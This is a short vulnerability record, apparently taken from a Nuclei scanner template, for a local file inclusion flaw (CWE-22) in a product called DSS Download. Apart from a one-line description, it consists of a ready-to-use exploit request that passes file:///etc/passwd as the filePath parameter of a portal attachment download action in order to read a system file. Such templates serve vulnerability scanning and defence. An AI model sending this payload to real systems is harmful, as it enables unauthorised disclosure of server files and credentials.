# Vulnerability: DSS Download - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`dss-download-fileread.yaml`)

## Description
DSS Download is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
```

